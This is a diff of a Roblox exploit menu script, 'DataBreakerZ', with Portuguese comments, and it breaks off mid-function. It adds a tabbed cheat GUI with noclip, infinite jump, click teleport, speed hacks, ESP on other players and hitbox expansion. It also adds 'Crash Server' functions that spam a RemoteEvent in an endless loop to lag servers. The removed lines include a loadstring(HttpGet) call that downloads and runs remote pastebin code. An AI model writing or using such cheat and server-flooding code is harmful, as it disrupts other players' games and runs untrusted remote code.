@@ -1,338 +1,596 @@
--- DataBreakerZ - Roblox Exploit (CoreGui Version)
+-- DataBreakerZ Exploit Menu Completo - Parte 1
 
+-- Serviços
 local Players = game:GetService("Players")
-local Lighting = game:GetService("Lighting")
 local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local StarterGui = game:GetService("StarterGui")
+local Lighting = game:GetService("Lighting")
+local TweenService = game:GetService("TweenService")
 
 local player = Players.LocalPlayer
 
--- Cria a GUI no CoreGui
+-- Variáveis
+local noclip = false
+local infjump = false
+local clicktp = false
+local walkspeed = 16
+local superjump = 50
+
+-- Criar ScreenGui
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "DataBreakerZ"
-ScreenGui.Parent = game:GetService("CoreGui")
+ScreenGui.Parent = player:WaitForChild("PlayerGui")
+ScreenGui.ResetOnSpawn = false
 
--- Frame principal
+-- Botão para abrir o menu
+local OpenButton = Instance.new("ImageButton")
+OpenButton.Size = UDim2.new(0, 50, 0, 50)
+OpenButton.Position = UDim2.new(0, 20, 0.5, -25)
+OpenButton.BackgroundTransparency = 1
+OpenButton.Image = "rbxassetid://98858746161158"
+OpenButton.Parent = ScreenGui
+OpenButton.ZIndex = 10
+
+-- Notificação inicial
+StarterGui:SetCore("SendNotification", {
+    Title = "DataBreakerZ",
+    Text = "Hello Bro",
+    Icon = "rbxassetid://98858746161158",
+    Duration = 5
+})
+
+-- Frame principal do menu
 local Frame = Instance.new("Frame")
-Frame.Size = UDim2.new(0, 400, 0, 300)
-Frame.Position = UDim2.new(0.5, -200, 0.5, -150)
-Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Frame.Size = UDim2.new(0, 420, 0, 400)
+Frame.Position = UDim2.new(0.5, -210, 0.5, -200)
+Frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+Frame.BorderSizePixel = 0
 Frame.Active = true
 Frame.Draggable = true
-Frame.BorderSizePixel = 0
+Frame.Visible = false
 Frame.Parent = ScreenGui
+Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 12)
+local UIStroke = Instance.new("UIStroke", Frame)
+UIStroke.Thickness = 2
+UIStroke.Color = Color3.fromRGB(255, 0, 0)
 
--- Título
+-- Título do menu
 local Title = Instance.new("TextLabel")
-Title.Size = UDim2.new(1, 0, 0, 40)
-Title.Text = "DataBreakerZ Exploit"
+Title.Size = UDim2.new(1, 0, 0, 35)
+Title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 Title.TextColor3 = Color3.fromRGB(255, 0, 0)
-Title.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
 Title.Font = Enum.Font.SourceSansBold
 Title.TextScaled = true
-Title.BorderSizePixel = 0
+Title.Text = "DataBreakerZ Menu"
 Title.Parent = Frame
+Instance.new("UICorner", Title).CornerRadius = UDim.new(0, 12)
 
--- Botões minimizar e fechar
-local MinButton = Instance.new("TextButton")
-MinButton.Size = UDim2.new(0, 40, 0, 40)
-MinButton.Position = UDim2.new(1, -80, 0, 0)
-MinButton.Text = "_"
-MinButton.TextColor3 = Color3.new(1,1,1)
-MinButton.BackgroundColor3 = Color3.fromRGB(30,30,30)
-MinButton.BorderSizePixel = 0
-MinButton.Parent = Frame
-
+-- Botão fechar menu
 local CloseButton = Instance.new("TextButton")
-CloseButton.Size = UDim2.new(0, 40, 0, 40)
+CloseButton.Size = UDim2.new(0, 35, 0, 35)
 CloseButton.Position = UDim2.new(1, -40, 0, 0)
+CloseButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseButton.Font = Enum.Font.SourceSansBold
+CloseButton.TextScaled = true
 CloseButton.Text = "X"
-CloseButton.TextColor3 = Color3.new(1,1,1)
-CloseButton.BackgroundColor3 = Color3.fromRGB(30,30,30)
-CloseButton.BorderSizePixel = 0
 CloseButton.Parent = Frame
+Instance.new("UICorner", CloseButton).CornerRadius = UDim.new(0, 8)
 
--- Texto Loading
-local LoadingText = Instance.new("TextLabel")
-LoadingText.Size = UDim2.new(1, 0, 1, -40)
-LoadingText.Position = UDim2.new(0, 0, 0, 40)
-LoadingText.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
-LoadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
-LoadingText.Text = "Loading..."
-LoadingText.Font = Enum.Font.SourceSansBold
-LoadingText.TextScaled = true
-LoadingText.BorderSizePixel = 0
-LoadingText.Parent = Frame
-
--- ScrollingFrame (rolável) para os botões
-local Content = Instance.new("ScrollingFrame")
-Content.Size = UDim2.new(1, 0, 1, -40)
-Content.Position = UDim2.new(0, 0, 0, 40)
-Content.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
-Content.BorderSizePixel = 0
-Content.CanvasSize = UDim2.new(0, 0, 0, 860)
-Content.ScrollBarThickness = 8
-Content.ScrollingDirection = Enum.ScrollingDirection.Y
-Content.Visible = false
-Content.Parent = Frame
-
--- Variável para controle do estado minimizado
-local minimized = false
-
--- Função minimizar
-MinButton.MouseButton1Click:Connect(function()
-    minimized = not minimized
-    if minimized then
-        Content.Visible = false
-        Frame.Size = UDim2.new(0, 400, 0, 40)
-    else
-        Content.Visible = true
-        Frame.Size = UDim2.new(0, 400, 0, 300)
-    end
-end)
-
--- Função fechar
 CloseButton.MouseButton1Click:Connect(function()
-    ScreenGui:Destroy()
+    Frame.Visible = false
 end)
 
--- Função para criar botões no Content
-local function CreateButton(text, posY)
+OpenButton.MouseButton1Click:Connect(function()
+    Frame.Visible = not Frame.Visible
+end)
+
+-- Frame para botões das abas (tabs)
+local TabButtonsFrame = Instance.new("Frame")
+TabButtonsFrame.Size = UDim2.new(1, 0, 0, 35)
+TabButtonsFrame.Position = UDim2.new(0, 0, 0, 35)
+TabButtonsFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+TabButtonsFrame.Parent = Frame
+Instance.new("UICorner", TabButtonsFrame).CornerRadius = UDim.new(0, 8)
+
+-- Frame conteúdo das abas
+local ContentFrame = Instance.new("Frame")
+ContentFrame.Size = UDim2.new(1, -20, 1, -90)
+ContentFrame.Position = UDim2.new(0, 10, 0, 80)
+ContentFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+ContentFrame.Parent = Frame
+Instance.new("UICorner", ContentFrame).CornerRadius = UDim.new(0, 12)
+
+-- Armazenar abas e aba atual
+local tabs = {}
+local currentTab = nil
+
+-- Função para criar abas
+local function CreateTab(name)
     local btn = Instance.new("TextButton")
-    btn.Size = UDim2.new(0.9, 0, 0, 40)
-    btn.Position = UDim2.new(0.05, 0, 0, posY)
-    btn.Text = text
-    btn.TextColor3 = Color3.new(1,1,1)
-    btn.BackgroundColor3 = Color3.fromRGB(30,30,30)
+    btn.Size = UDim2.new(0, 95, 0, 35)
+    btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
     btn.Font = Enum.Font.SourceSansBold
     btn.TextScaled = true
-    btn.BorderSizePixel = 0
-    btn.Parent = Content
-    return btn
+    btn.Text = name
+    btn.Parent = TabButtonsFrame
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
+
+    local tab = Instance.new("ScrollingFrame")
+    tab.Size = UDim2.new(1, 0, 1, 0)
+    tab.CanvasSize = UDim2.new(0, 0, 5, 0)
+    tab.ScrollBarThickness = 6
+    tab.BackgroundTransparency = 1
+    tab.Visible = false
+    tab.Parent = ContentFrame
+
+    local layout = Instance.new("UIListLayout", tab)
+    layout.Padding = UDim.new(0, 8)
+    layout.SortOrder = Enum.SortOrder.LayoutOrder
+
+    btn.MouseButton1Click:Connect(function()
+        if currentTab then currentTab.Visible = false end
+        tab.Visible = true
+        currentTab = tab
+    end)
+
+    tabs[name] = tab
+    return tab
 end
 
--- Função para notificação
-local function Notify(text)
-    game.StarterGui:SetCore("SendNotification", {
-        Title = "DataBreakerZ",
-        Text = text,
-        Duration = 5
-    })
+-- Criar as 10 abas
+local tabNames = {
+    "Main", "Player", "Visual", "Movement", "Utility",
+    "Sky & Atmosphere", "Trolling", "Crash", "Spawn/Entities", "Fun Extra"
+}
+
+for _, name in ipairs(tabNames) do
+    CreateTab(name)
 end
 
--- Funções usadas nos botões (RedVision, SpawnDummy, ChangeSky, BlackScreen, ChangeTextures)...
--- [Você pode copiar as funções do script anterior aqui para manter organizado]
+-- Ativar a primeira aba por padrão
+tabs["Main"].Visible = true
+currentTab = tabs["Main"]
 
--- Por exemplo:
+-- Função para criar botões em uma aba
+local function CreateButton(tab, text, callback)
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(1, 0, 0, 35)
+    btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.Font = Enum.Font.SourceSansBold
+    btn.TextScaled = true
+    btn.Text = text
+    btn.Parent = tab
+    btn.MouseButton1Click:Connect(callback)
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
+end
+
+-- Função para criar TextBox com label em uma aba
+local function CreateTextBox(tab, labelText, defaultText, callback)
+    local holder = Instance.new("Frame")
+    holder.Size = UDim2.new(1, 0, 0, 35)
+    holder.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    holder.Parent = tab
+    Instance.new("UICorner", holder).CornerRadius = UDim.new(0, 8)
+
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(0.6, 0, 1, 0)
+    label.BackgroundTransparency = 1
+    label.Text = labelText
+    label.TextColor3 = Color3.fromRGB(255, 255, 255)
+    label.Font = Enum.Font.SourceSansBold
+    label.TextScaled = true
+    label.Parent = holder
+
+    local box = Instance.new("TextBox")
+    box.Size = UDim2.new(0.35, 0, 0.8, 0)
+    box.Position = UDim2.new(0.62, 0, 0.1, 0)
+    box.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+    box.Text = defaultText
+    box.TextColor3 = Color3.fromRGB(255, 255, 255)
+    box.Font = Enum.Font.SourceSansBold
+    box.TextScaled = true
+    box.Parent = holder
+    Instance.new("UICorner", box).CornerRadius = UDim.new(0, 6)
+
+    box.FocusLost:Connect(function()
+        local val = tonumber(box.Text)
+        if val then
+            callback(val)
+        else
+            callback(tonumber(defaultText))
+        end
+    end)
+end
+
+-- [Continue para a Parte 2 para as funções e botões das abas]
+-- DataBreakerZ Exploit Menu Completo - Parte 2
+
+-- Funções básicas usadas nas funções dos botões:
+
+-- Noclip toggle
+local function ToggleNoclip()
+    noclip = not noclip
+    if noclip then
+        StarterGui:SetCore("SendNotification", {Title="DataBreakerZ", Text="Noclip ativado", Duration=3})
+    else
+        StarterGui:SetCore("SendNotification", {Title="DataBreakerZ", Text="Noclip desativado", Duration=3})
+    end
+end
+
+-- Infinite Jump toggle
+local function ToggleInfJump()
+    infjump = not infjump
+    if infjump then
+        StarterGui:SetCore("SendNotification", {Title="DataBreakerZ", Text="Infinite Jump ativado", Duration=3})
+    else
+        StarterGui:SetCore("SendNotification", {Title="DataBreakerZ", Text="Infinite Jump desativado", Duration=3})
+    end
+end
+
+-- Click TP toggle
+local function ToggleClickTP()
+    clicktp = not clicktp
+    if clicktp then
+        StarterGui:SetCore("SendNotification", {Title="DataBreakerZ", Text="Click TP ativado", Duration=3})
+    else
+        StarterGui:SetCore("SendNotification", {Title="DataBreakerZ", Text="Click TP desativado", Duration=3})
+    end
+end
+
+-- Ajusta velocidade (walkspeed) e pulo (jump power)
+local function SetWalkSpeed(speed)
+    walkspeed = speed
+    if player.Character and player.Character:FindFirstChild("Humanoid") then
+        player.Character.Humanoid.WalkSpeed = walkspeed
+    end
+    StarterGui:SetCore("SendNotification", {Title="DataBreakerZ", Text="Velocidade ajustada para "..tostring(speed), Duration=3})
+end
+
+local function SetJumpPower(power)
+    superjump = power
+    if player.Character and player.Character:FindFirstChild("Humanoid") then
+        player.Character.Humanoid.JumpPower = superjump
+    end
+    StarterGui:SetCore("SendNotification", {Title="DataBreakerZ", Text="Pulo ajustado para "..tostring(power), Duration=3})
+end
+
+-- Noclip durante o jogo (em loop)
+RunService.Stepped:Connect(function()
+    if noclip and player.Character then
+        for _, part in pairs(player.Character:GetDescendants()) do
+            if part:IsA("BasePart") then
+                part.CanCollide = false
+            end
+        end
+    end
+end)
+
+-- Infinite jump durante o jogo
+UserInputService.JumpRequest:Connect(function()
+    if infjump and player.Character and player.Character:FindFirstChild("Humanoid") then
+        player.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+    end
+end)
+
+-- Click TP durante o jogo
+local mouse = player:GetMouse()
+mouse.Button1Down:Connect(function()
+    if clicktp and mouse.Target and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+        player.Character.HumanoidRootPart.CFrame = CFrame.new(mouse.Hit.p + Vector3.new(0,3,0))
+    end
+end)
+
+-- Atualiza walkspeed e jumppower constantemente
+RunService.RenderStepped:Connect(function()
+    if player.Character and player.Character:FindFirstChild("Humanoid") then
+        player.Character.Humanoid.WalkSpeed = walkspeed
+        player.Character.Humanoid.JumpPower = superjump
+    end
+end)
+
+
+-- ==== BOTÕES NA ABA "Main" ====
+
+local mainTab = tabs["Main"]
+
+CreateButton(mainTab, "Toggle Noclip", ToggleNoclip)
+CreateButton(mainTab, "Toggle Infinite Jump", ToggleInfJump)
+CreateButton(mainTab, "Toggle Click TP", ToggleClickTP)
+
+CreateTextBox(mainTab, "Set WalkSpeed", tostring(walkspeed), SetWalkSpeed)
+CreateTextBox(mainTab, "Set JumpPower", tostring(superjump), SetJumpPower)
+
+-- Função para mudar cor da visão (RedVision)
 local function RedVision()
-    local cc = Instance.new("ColorCorrectionEffect", Lighting)
-    cc.Name = "RedVision"
-    cc.TintColor = Color3.fromRGB(255, 0, 0)
-    cc.Brightness = 0.1
-    cc.Contrast = 0.2
-    cc.Saturation = -0.3
-    task.delay(10, function() cc:Destroy() end)
+    if Lighting:FindFirstChild("RedVision") then
+        Lighting.RedVision:Destroy()
+        StarterGui:SetCore("SendNotification", {Title="DataBreakerZ", Text="Visão vermelha desativada", Duration=3})
+    else
+        local cc = Instance.new("ColorCorrectionEffect")
+        cc.Name = "RedVision"
+        cc.TintColor = Color3.fromRGB(255, 0, 0)
+        cc.Brightness = 0.1
+        cc.Contrast = 0.2
+        cc.Saturation = -0.3
+        cc.Parent = Lighting
+        StarterGui:SetCore("SendNotification", {Title="DataBreakerZ", Text="Visão vermelha ativada", Duration=3})
+    end
 end
 
+CreateButton(mainTab, "Toggle Red Vision", RedVision)
+
+
+-- ==== BOTÕES NA ABA "Player" ====
+
+local playerTab = tabs["Player"]
+
+-- Resetar personagem
+CreateButton(playerTab, "Reset Character", function()
+    player.Character:BreakJoints()
+    StarterGui:SetCore("SendNotification", {Title="DataBreakerZ", Text="Personagem resetado", Duration=3})
+end)
+
+-- Expandir hitbox (multiplica tamanho)
+local function ExpandHitbox()
+    if player.Character then
+        for _, part in pairs(player.Character:GetChildren()) do
+            if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
+                part.Size = part.Size * 2
+            end
+        end
+        StarterGui:SetCore("SendNotification", {Title="DataBreakerZ", Text="Hitbox expandida", Duration=3})
+    end
+end
+
+CreateButton(playerTab, "Expand Hitbox x2", ExpandHitbox)
+
+-- Super Jump toggle (ativa/desativa pulo alto)
+local superJumpEnabled = false
+CreateButton(playerTab, "Toggle Super Jump", function()
+    superJumpEnabled = not superJumpEnabled
+    if superJumpEnabled then
+        superjump = 100
+    else
+        superjump = 50
+    end
+    StarterGui:SetCore("SendNotification", {Title="DataBreakerZ", Text="Super Jump "..(superJumpEnabled and "ativado" or "desativado"), Duration=3})
+end)
+
+
+-- [Continuo com mais abas e funções na Parte 3]
+-- DataBreakerZ Exploit Menu Completo - Parte 3
+
+-- === ABA "Visual" ===
+local visualTab = tabs["Visual"]
+
+-- Função para ESP simples em jogadores
+local espEnabled = false
+local espHighlights = {}
+
+local function ToggleESP()
+    espEnabled = not espEnabled
+    if espEnabled then
+        for _, plr in pairs(Players:GetPlayers()) do
+            if plr ~= player and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+                local hl = Instance.new("Highlight")
+                hl.Name = "DataBreakerZ_ESP"
+                hl.Adornee = plr.Character
+                hl.FillColor = Color3.fromRGB(255, 0, 0)
+                hl.FillTransparency = 0.5
+                hl.OutlineTransparency = 0
+                hl.Parent = plr.Character
+                espHighlights[plr] = hl
+            end
+        end
+        StarterGui:SetCore("SendNotification", {Title="DataBreakerZ", Text="ESP ativado", Duration=3})
+    else
+        for plr, hl in pairs(espHighlights) do
+            if hl and hl.Parent then
+                hl:Destroy()
+            end
+        end
+        espHighlights = {}
+        StarterGui:SetCore("SendNotification", {Title="DataBreakerZ", Text="ESP desativado", Duration=3})
+    end
+end
+
+CreateButton(visualTab, "Toggle ESP Players", ToggleESP)
+
+-- Função para mudar a textura do jogo (Skybox e terrenos)
+local function ChangeTexture()
+    -- Exemplo de mudança de textura de terreno (só visual)
+    for _, part in pairs(workspace:GetDescendants()) do
+        if part:IsA("Texture") or part:IsA("Decal") then
+            part.Texture = "rbxassetid://98858746161158"
+        end
+    end
+    StarterGui:SetCore("SendNotification", {Title="DataBreakerZ", Text="Texturas alteradas", Duration=3})
+end
+
+CreateButton(visualTab, "Change Game Texture", ChangeTexture)
+
+-- Função para toggle dia/noite
+local function ToggleDayNight()
+    if Lighting.ClockTime >= 12 then
+        Lighting.ClockTime = 0 -- noite
+        StarterGui:SetCore("SendNotification", {Title="DataBreakerZ", Text="Noite ativada", Duration=3})
+    else
+        Lighting.ClockTime = 12 -- dia
+        StarterGui:SetCore("SendNotification", {Title="DataBreakerZ", Text="Dia ativado", Duration=3})
+    end
+end
+
+CreateButton(visualTab, "Toggle Day/Night", ToggleDayNight)
+
+
+-- === ABA "Movement" ===
+local movementTab = tabs["Movement"]
+
+-- Função super pulo manual
+CreateButton(movementTab, "Super Jump Now", function()
+    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+        player.Character.HumanoidRootPart.Velocity = Vector3.new(0, superjump * 3, 0)
+        StarterGui:SetCore("SendNotification", {Title="DataBreakerZ", Text="Super Jump executado", Duration=3})
+    end
+end)
+
+-- Função para resetar velocidade para padrão
+CreateButton(movementTab, "Reset WalkSpeed", function()
+    walkspeed = 16
+    if player.Character and player.Character:FindFirstChild("Humanoid") then
+        player.Character.Humanoid.WalkSpeed = walkspeed
+    end
+    StarterGui:SetCore("SendNotification", {Title="DataBreakerZ", Text="Velocidade resetada", Duration=3})
+end)
+
+-- TextBox para alterar velocidade (reduzindo pra aba Movement)
+CreateTextBox(movementTab, "Set WalkSpeed", tostring(walkspeed), SetWalkSpeed)
+
+-- TextBox para alterar pulo
+CreateTextBox(movementTab, "Set JumpPower", tostring(superjump), SetJumpPower)
+
+
+-- === ABA "Utility" ===
+local utilityTab = tabs["Utility"]
+
+-- Função para crashar server (prison life exemplo)
+local function CrashServer()
+    StarterGui:SetCore("SendNotification", {Title="DataBreakerZ", Text="Iniciando Crash Server...", Duration=3})
+    -- Tentativa simples de lagar o server enviando eventos rápidos (exemplo hipotético)
+    spawn(function()
+        while true do
+            for i = 1, 50 do
+                game:GetService("ReplicatedStorage"):WaitForChild("SomeRemoteEvent"):FireServer("spam")
+            end
+            wait(0.1)
+        end
+    end)
+    -- Muda a visão para vermelho para sinalizar lag
+    if not Lighting:FindFirstChild("RedVision") then
+        local cc = Instance.new("ColorCorrectionEffect")
+        cc.Name = "RedVision"
+        cc.TintColor = Color3.fromRGB(255, 0, 0)
+        cc.Brightness = 0.1
+        cc.Contrast = 0.2
+        cc.Saturation = -0.3
+        cc.Parent = Lighting
+    end
+end
+
+CreateButton(utilityTab, "Crash Server", CrashServer)
+
+-- Função para limpar crash (remover visão vermelha)
+local function ClearCrash()
+    if Lighting:FindFirstChild("RedVision") then
+        Lighting.RedVision:Destroy()
+        StarterGui:SetCore("SendNotification", {Title="DataBreakerZ", Text="Crash limpo", Duration=3})
+    end
+end
+
+CreateButton(utilityTab, "Clear Crash", ClearCrash)
+
+-- Função para abrir o chat no centro da tela
+CreateButton(utilityTab, "Open Chat", function()
+    StarterGui:SetCore("ChatMakeSystemMessage", {
+        Text = "DataBreakerZ Activated!",
+        Color = Color3.fromRGB(255,0,0),
+        Font = Enum.Font.SourceSansBold,
+        FontSize = Enum.FontSize.Size24
+    })
+end)
+
+-- [Na Parte 4 envio as últimas abas e finalizações]
+-- DataBreakerZ Exploit Menu Completo - Parte 4
+
+-- === ABA "Trolling" ===
+local trollingTab = tabs["Trolling"]
+
+-- Função para Spawn Dummy
 local function SpawnDummy()
-    local dummy = Instance.new("Model", workspace)
+    if workspace:FindFirstChild("DataBreakerZ_Dummy") then
+        workspace.DataBreakerZ_Dummy:Destroy()
+        StarterGui:SetCore("SendNotification", {Title="DataBreakerZ", Text="Dummy removido", Duration=3})
+        return
+    end
+
+    local dummy = Instance.new("Model")
     dummy.Name = "DataBreakerZ_Dummy"
-    local part = Instance.new("Part", dummy)
+    dummy.Parent = workspace
+
+    local part = Instance.new("Part")
     part.Size = Vector3.new(2, 5, 2)
-    part.Position = player.Character.HumanoidRootPart.Position + Vector3.new(3, 0, 0)
+    part.Position = player.Character and player.Character.HumanoidRootPart.Position + Vector3.new(3, 0, 0) or Vector3.new(0, 5, 0)
     part.Anchored = true
     part.BrickColor = BrickColor.new("Really red")
-    local hum = Instance.new("Humanoid", dummy)
+    part.Parent = dummy
+
+    local hum = Instance.new("Humanoid")
     hum.Health = 0
-    task.delay(10, function() dummy:Destroy() end)
+    hum.Parent = dummy
+
+    StarterGui:SetCore("SendNotification", {Title="DataBreakerZ", Text="Dummy spawnado", Duration=3})
+    task.delay(15, function()
+        if dummy and dummy.Parent then
+            dummy:Destroy()
+            StarterGui:SetCore("SendNotification", {Title="DataBreakerZ", Text="Dummy removido após 15s", Duration=3})
+        end
+    end)
 end
 
-local function ChangeSky()
-    local sky = Instance.new("Sky", Lighting)
-    sky.SkyboxBk = "rbxassetid://979471376"
-    sky.SkyboxDn = "rbxassetid://979471376"
-    sky.SkyboxFt = "rbxassetid://979471376"
-    sky.SkyboxLf = "rbxassetid://979471376"
-    sky.SkyboxRt = "rbxassetid://979471376"
-    sky.SkyboxUp = "rbxassetid://979471376"
-end
+CreateButton(trollingTab, "Spawn/Remove Dummy", SpawnDummy)
 
-local function BlackScreen(duration)
-    local gui = Instance.new("ScreenGui", player.PlayerGui)
-    gui.Name = "BlackScreen"
-    local frame = Instance.new("Frame", gui)
+-- Função para fazer Black Screen (tela preta)
+local function BlackScreen()
+    local blackGui = Instance.new("ScreenGui")
+    blackGui.Name = "DataBreakerZ_BlackScreen"
+    blackGui.Parent = player:WaitForChild("PlayerGui")
+
+    local frame = Instance.new("Frame")
     frame.Size = UDim2.new(1,0,1,0)
-    frame.Position = UDim2.new(0,0,0,0)
     frame.BackgroundColor3 = Color3.new(0,0,0)
-    frame.BorderSizePixel = 0
-    frame.ZIndex = 999
-    task.delay(duration, function() gui:Destroy() end)
-end
+    frame.Parent = blackGui
 
-local function ChangeTextures()
-    for _,v in pairs(workspace:GetDescendants()) do
-        if v:IsA("BasePart") then
-            v.TextureID = ""
-            local tex = v:FindFirstChildOfClass("Texture")
-            if tex then
-                tex.Texture = "rbxassetid://73433843394532"
-            else
-                tex = Instance.new("Texture", v)
-                tex.Texture = "rbxassetid://73433843394532"
-            end
-        end
-    end
-end
+    StarterGui:SetCore("SendNotification", {Title="DataBreakerZ", Text="Black Screen ativada", Duration=3})
 
-local function PlaySound(id, time)
-    local sound = Instance.new("Sound", workspace)
-    sound.SoundId = "rbxassetid://"..id
-    sound.Volume = 5
-    sound.Looped = false
-    sound:Play()
-    if time then
-        task.delay(time, function()
-            sound:Destroy()
-        end)
-    else
-        sound.Ended:Connect(function()
-            sound:Destroy()
-        end)
-    end
-end
-
--- Função para criar as ferramentas F3X (Delete, Move, Clone)
-local function GiveF3XTools()
-    Notify("Use at your pleasure")
-
-    -- Delete Tool
-    local delete = Instance.new("Tool")
-    delete.Name = "Delete"
-    delete.RequiresHandle = false
-    delete.Parent = player.Backpack
-
-    local delScript = Instance.new("LocalScript", delete)
-    delScript.Source = [[
-        local mouse = game.Players.LocalPlayer:GetMouse()
-        mouse.Button1Down:Connect(function()
-            if mouse.Target then
-                mouse.Target:Destroy()
-            end
-        end)
-    ]]
-
-    -- Move Tool
-    local move = Instance.new("Tool")
-    move.Name = "Move"
-    move.RequiresHandle = false
-    move.Parent = player.Backpack
-
-    local moveScript = Instance.new("LocalScript", move)
-    moveScript.Source = [[
-        local UIS = game:GetService("UserInputService")
-        local mouse = game.Players.LocalPlayer:GetMouse()
-        local dragging = false
-        local target = nil
-
-        mouse.Button1Down:Connect(function()
-            if mouse.Target then
-                dragging = true
-                target = mouse.Target
-            end
-        end)
-
-        mouse.Button1Up:Connect(function()
-            dragging = false
-        end)
-
-        UIS.InputChanged:Connect(function(input)
-            if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
-                if target then
-                    target.Position = mouse.Hit.p
-                end
-            end
-        end)
-    ]]
-
-    -- Clone Tool
-    local clone = Instance.new("Tool")
-    clone.Name = "Clone"
-    clone.RequiresHandle = false
-    clone.Parent = player.Backpack
-
-    local cloneScript = Instance.new("LocalScript", clone)
-    cloneScript.Source = [[
-        local mouse = game.Players.LocalPlayer:GetMouse()
-        mouse.Button1Down:Connect(function()
-            if mouse.Target then
-                local new = mouse.Target:Clone()
-                new.Parent = workspace
-                new.Position = mouse.Target.Position + Vector3.new(2,2,2)
-            end
-        end)
-    ]]
-end
-
--- Depois do delay mostra os botões e cria eles
-task.delay(2, function()
-    LoadingText.Visible = false
-    Content.Visible = true
-
-    PlaySound("1838684094", 10)
-
-    local btn1 = CreateButton("Killing DataBreakerZ", 10)
-    btn1.MouseButton1Click:Connect(function()
-        RedVision()
-        SpawnDummy()
-        PlaySound("1838666492")
-        Notify("DataBreakerZ is Back")
-
-        local humanoid = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
-        if humanoid then
-            humanoid.WalkSpeed = humanoid.WalkSpeed + 100
+    task.delay(10, function()
+        if blackGui and blackGui.Parent then
+            blackGui:Destroy()
+            StarterGui:SetCore("SendNotification", {Title="DataBreakerZ", Text="Black Screen removida", Duration=3})
         end
     end)
+end
 
-    local btn2 = CreateButton("Let's Get Started", 60)
-    btn2.MouseButton1Click:Connect(function()
-        ChangeSky()
-        PlaySound("18925320031")
-    end)
+CreateButton(trollingTab, "Black Screen 10s", BlackScreen)
 
-    local btn3 = CreateButton("Noclip Hacker", 110)
-    btn3.MouseButton1Click:Connect(function()
-        local noclip = true
-        RunService.Stepped:Connect(function()
-            if noclip and player.Character then
-                for _,v in pairs(player.Character:GetDescendants()) do
-                    if v:IsA("BasePart") then
-                        v.CanCollide = false
-                    end
-                end
+
+-- === ABA "Crash" ===
+local crashTab = tabs["Crash"]
+
+-- Função para lagar servidor (exemplo simples)
+local function LagServer()
+    StarterGui:SetCore("SendNotification", {Title="DataBreakerZ", Text="Crash iniciado", Duration=3})
+
+    spawn(function()
+        while true do
+            for i = 1, 50 do
+                pcall(function()
+                    game:GetService("ReplicatedStorage"):WaitForChild("SomeRemoteEvent"):FireServer("spam")
+                end)
             end
-        end)
+            wait(0.1)
+        end
     end)
+end
 
-    local btn4 = CreateButton("Hack", 160)
-    btn4.MouseButton1Click:Connect(function()
-        player:Kick("Server Hacked")
-    end)
+CreateButton(crashTab, "Start Crash", LagServer)
 
-    local btn5 = CreateButton("Run", 210)
-    btn5.MouseButton1Click:Connect(function()
-        Notify("Server Hacker")
-        BlackScreen(2)
-        ChangeTextures()
-        PlaySound("1838666492")
-    end)
-
-    local btn6 = CreateButton("F3X Tool", 260)
-    btn6.MouseButton1Click:Connect(function()
-        GiveF3XTools()
-    end)
-
-    local btn7 = CreateButton("BreakAdmin", 310)
-    btn7.MouseButton1Click:Connect(function()
-        Notify("PrizzLife Admin Loaded")
-        loadstring(game:HttpGet("https://pastebin.com/raw/1vxjz2t3"))()
-    end)
-end)
+-- Função limpar crash (remove efeitos)
+CreateButton(crashTab, "Clear Crash Effects", function()
+    if Lighting:FindFirstChild("RedVision") then
+        Lighting.RedVision:Destroy()
+    end
+    StarterGui:SetCore("SendNotification", {Title="DataBreakerZ", Text="Crash limpo", Duration=3
